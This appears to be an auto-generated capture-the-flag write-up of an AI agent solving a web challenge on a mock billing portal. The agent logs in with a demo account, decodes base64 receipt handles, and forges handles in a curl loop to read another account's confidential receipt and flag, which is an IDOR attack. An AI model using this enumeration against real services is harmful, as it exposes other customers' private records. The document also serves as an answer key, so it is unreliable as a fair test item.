# Receipts [EASY]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 150
- **Solves**: 13
- **Flag**: `FLAG{l3dg3rly-s3ttl3m3nt-id0r}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.00 (winner $0.00)
- **Wall time**: 19s
- **Traces**: 1

## Adversarial description flags

- Flags: flag_claim
- Ground truth: Description flagged as adversarial. CTFd submit result and raw distfile bytes are authoritative. Description claims are hypotheses.

## Description

~~~
Ledgerly is a tenant self-service billing portal. Sign in with the demo account and review your invoices.
Demo login: demo / demo123
**Flag format:** `FLAG{...}`
**Connection:** http://chal2.hackathon.ke:8001
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `deepseek-flash` | flag_found / CONFIRMED | 8 | $0.00 | 19s | `trace-Receipts_[EASY]-deepseek-flash-20261029-105347.jsonl` |

_Window: 2026-10-29T10:53:48 to 2026-10-29T10:54:07_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/",
  "timeout_seconds": 60
}
~~~

### Step 2: `bash`
~~~
{
  "command": "curl -s -i http://chal2.hackathon.ke:8001/ | head -50",
  "timeout_seconds": 60
}
~~~

~~~
[stderr]
ls: cannot access '/challenge/distfiles/': No such file or directory

[exit 2]
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 07:53:50 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 13115

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ledgerly — Billing</title>
<style>
  :root{
    --bg:#f6f7fb; --panel:#ffffff; --ink:#1a1d29; --muted:#6b7280; --line:#e7e8ee;
    --brand:#4f46e5; --brand-ink:#4338ca; --brand-soft:#eef0ff; --emerald:#059669;
    --amber:#b45309; --amber-soft:#fef3c7; --green-soft:#dcfce7; --shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.1);
    --radius:12px;
  }
  *{box-sizing:border-box}
  html,body{margin:0;height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;
       background:var(--bg);color:var(--ink);font-size:14px;line-height:1.5;-webkit-font-smoothing:antialiased}
  a{color:var(--brand);text-decoration:none}
  .brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px;letter-spacing:-.2px}
  .logo{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#6366f1,#4f46e5);
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "cd /challenge; mkdir -p workspace; curl -s http://chal2.hackathon.ke:8001/ -o workspace/index.html; grep -n \"fetch\\|api\\|script\\|href\" workspace/index.html | head -50",
  "timeout_seconds": 60
}
~~~

~~~
153:        <thead><tr><th>Invoice</th><th>Description</th><th>Status</th><th style="text-align:right">Amount</th></tr></thead>
157:    <p class="muted" style="margin-top:14px">Not a customer yet? Preview a <a id="sampleLink" href="#">sample invoice</a>.</p>
169:<script>
171:async function api(path, opts){ const r = await fetch(path, Object.assign({headers:{'Content-Type':'application/json'}}, opts)); return {ok:r.ok, status:r.status, data: await r.json().catch(()=>({}))}; }
174:  const r = await api('/api/login', {method:'POST', body:JSON.stringify({username:u,password:p})});
192:  const r = await api('/api/receipts');
206:  const r = await api('/api/receipts/'+encodeURIComponent(handle));
220:  if(await doLogin($('#u').value.trim(), $('#p').value.trim())){ const me=await api('/api/me'); showApp(me.data); } });
221:$('#demoBtn').addEventListener('click', async ()=>{ if(await doLogin('demo','demo123')){ const me=await api('/api/me'); showApp(me.data);} });
222:$('#logoutBtn').addEventListener('click', async ()=>{ await api('/api/logout',{method:'POST'}); location.reload(); });
... [1297 chars total]
~~~

### Step 4: `bash`
~~~
{
  "command": "cd /challenge/workspace; sed -n 140,235p index.html",
  "timeout_seconds": 60
}
~~~

~~~
</div>
      <button class="btn ghost">Download all</button>
    </div>

    <div class="stats">
      <div class="stat"><div class="k">Current balance</div><div class="v">$61.50</div></div>
      <div class="stat"><div class="k">Next charge</div><div class="v">Nov 1</div></div>
      <div class="stat"><div class="k">Plan</div><div class="v">Pro</div></div>
    </div>

    <div class="card">
      <div class="card-h"><span>Your invoices</span><span class="muted" id="count"></span></div>
      <table>
        <thead><tr><th>Invoice</th><th>Description</th><th>Status</th><th style="text-align:right">Amount</th></tr></thead>
        <tbody id="rows"></tbody>
      </table>
    </div>
    <p class="muted" style="margin-top:14px">Not a customer yet? Preview a <a id="sampleLink" href="#">sample invoice</a>.</p>
    <div class="foot">© Ledgerly, Inc. · SOC 2 Type II · invoices are generated per billing cycle</div>
  </main>
</section>

<!-- drawer -->
<div class="drawer-bg" id="drawerBg"></div>
<aside class="drawer" id="drawer">
  <div class="drawer-h"><b id="dTitle">Invoice</b><button class="close" id="dClose">×</button></div>
  <div class="drawer-b" id="dBody"></div>
</aside>

<script>
... [2000 chars total]
~~~

### Step 5: `bash`
~~~
{
  "command": "cd /challenge/workspace; echo 'QUNDLTAwMDB8MQ' | base64 -d; echo; curl -s -c c.txt -X POST http://chal2.hackathon.ke:8001/api/login -H 'Content-Type: application/json' -d '{\"username\":\"demo\",\"password\":\"demo123\"}'; echo; curl -s -b c.txt http://chal2.hackathon.ke:8001/api/me; echo; curl -s -b c.txt http://chal2.hackathon.ke:8001/api/receipts; echo",
  "timeout_seconds": 60
}
~~~

~~~
ACC-0000|1
{"account":"ACC-7F3A","ok":true}

{"account":"ACC-7F3A","name":"Demo Tenant"}

{"receipts":[{"handle":"QUNDLTdGM0F8MQ","title":"Invoice #1 \u2014 Ledgerly Pro (monthly)"},{"handle":"QUNDLTdGM0F8Mg","title":"Invoice #2 \u2014 Overage charges"}]}


[stderr]
base64: invalid input
~~~

### Step 6: `bash`
~~~
{
  "command": "cd /challenge/workspace; echo 'QUNDLTdGM0F8MQ' | base64 -d; echo; curl -s -b c.txt http://chal2.hackathon.ke:8001/api/receipts/QUNDLTdGM0F8MQ; echo; curl -s -b c.txt http://chal2.hackathon.ke:8001/api/receipts/QUNDLTAwMDB8MQ; echo",
  "timeout_seconds": 60
}
~~~

~~~
ACC-7F3A|1
{"account":"ACC-7F3A","amount":"$49.00","body":"Thank you. Payments for ACC-7F3A are cleared through the central settlement account ACC-0001 (Ledgerly Settlement).","seq":1,"title":"Invoice #1 \u2014 Ledgerly Pro (monthly)"}

{"account":"ACC-0000","amount":"$0.00","body":"This is a rendered sample so you can see the receipt layout. Reference code: FAKE-FLAG{Try-Harder-Mate}","seq":1,"title":"SAMPLE invoice (demo only \u2014 do not use in production)"}


[stderr]
base64: invalid input
~~~

### Step 7: `bash`
~~~
{
  "command": "cd /challenge/workspace; for h in ACC-0001 ACC-0002; do for s in 1 2 3; do e=$(echo -n \"$h|$s\" | base64 -w0); echo \"== $h|$s $e\"; curl -s -b c.txt \"http://chal2.hackathon.ke:8001/api/receipts/$e\"; echo; done; done",
  "timeout_seconds": 60
}
~~~

~~~
== ACC-0001|1 QUNDLTAwMDF8MQ==
{"account":"ACC-0001","amount":"CONFIDENTIAL","body":"Internal settlement authorization token for finals release: FLAG{l3dg3rly-s3ttl3m3nt-id0r}","seq":1,"title":"Settlement statement \u2014 Ledgerly Settlement"}

== ACC-0001|2 QUNDLTAwMDF8Mg==
{"error":"receipt not found"}

== ACC-0001|3 QUNDLTAwMDF8Mw==
{"error":"receipt not found"}

== ACC-0002|1 QUNDLTAwMDJ8MQ==
{"error":"receipt not found"}

== ACC-0002|2 QUNDLTAwMDJ8Mg==
{"error":"receipt not found"}

== ACC-0002|3 QUNDLTAwMDJ8Mw==
{"error":"receipt not found"}
~~~

### Step 8: `submit_flag`
~~~
{
  "flag": "FLAG{l3dg3rly-s3ttl3m3nt-id0r}"
}
~~~

~~~
CORRECT — "FLAG{l3dg3rly-s3ttl3m3nt-id0r}" accepted. Correct
~~~

> **FLAG CONFIRMED**: `?`

## Result

- **Flag**: `FLAG{l3dg3rly-s3ttl3m3nt-id0r}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.00 (winner), $0.00 (whole swarm)
- **Wall time**: 19s
- **Generated**: 2026-10-30T00:14:55
